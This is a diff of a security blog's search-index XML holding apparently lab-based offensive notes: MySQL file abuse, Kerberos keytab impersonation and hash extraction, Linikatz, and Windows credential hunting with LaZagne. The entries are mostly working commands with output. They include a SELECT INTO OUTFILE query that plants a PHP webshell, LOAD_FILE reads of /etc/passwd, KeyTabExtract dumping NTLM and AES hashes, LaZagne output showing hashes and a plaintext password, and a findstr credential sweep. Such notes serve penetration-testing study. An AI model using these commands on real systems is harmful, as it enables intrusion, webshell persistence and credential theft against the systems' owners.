   <entry>
@@ -789,46 +794,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PTT : Abusing KeyTab ccache</title>
     <url>/2025/11/29/PTT-Abusing-KeyTab-ccache/</url>
     <content><![CDATA[<h1 id="Finding-ccache-files"><a href="#Finding-ccache-files" class="headerlink" title="Finding ccache files"></a>Finding ccache files</h1><h4 id="Reviewing-environment-variables-for-ccache-files"><a href="#Reviewing-environment-variables-for-ccache-files" class="headerlink" title="Reviewing environment variables for ccache files."></a>Reviewing environment variables for ccache files.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">env</span> | grep -i krb5</span><br><span class="line"></span><br><span class="line">KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh</span><br></pre></td></tr></table></figure>
@@ -858,6 +823,50 @@
       <tags>
         <tag>klist</tag>
         <tag>ccache</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PTT : KeyTab File Abuse</title>
+    <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
+    <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
+<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
+<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
+
+<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist </span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
+
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p> <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
+<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Post Exploitation</category>
+        <category>Pass the Ticket (Ptt)</category>
+        <category>KeyTab File Abuse</category>
+      </categories>
+      <tags>
+        <tag>klist</tag>
+        <tag>kinit</tag>
+        <tag>KeyTabExtract</tag>
       </tags>
   </entry>
   <entry>
@@ -1018,47 +1027,91 @@
       </tags>
   </entry>
   <entry>
-    <title>PTT : KeyTab File Abuse</title>
-    <url>/2025/11/29/PTT-KeyTab-File-Abuse/</url>
-    <content><![CDATA[<h1 id="Finding-Keytab-files"><a href="#Finding-Keytab-files" class="headerlink" title="Finding Keytab files"></a>Finding Keytab files</h1><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><p><code>➜ To use a keytab file, we must have read and write (rw) privileges on the file.</code></p>
-<p><code>➜ A Linux joined machine needs a ticket to interact with AD, this ticket is located on /etc/krb5.keytab and we can&#39;t read it without root permission.</code></p>
-<h4 id="Using-Find"><a href="#Using-Find" class="headerlink" title="Using Find"></a>Using Find</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name *keytab* -<span class="built_in">ls</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab</span><br><span class="line">   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+<li><code>KeePass memory extraction</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
-
-<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist </span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
-
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p> <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
+]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab File Abuse</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
       </categories>
       <tags>
-        <tag>klist</tag>
-        <tag>kinit</tag>
-        <tag>KeyTabExtract</tag>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span 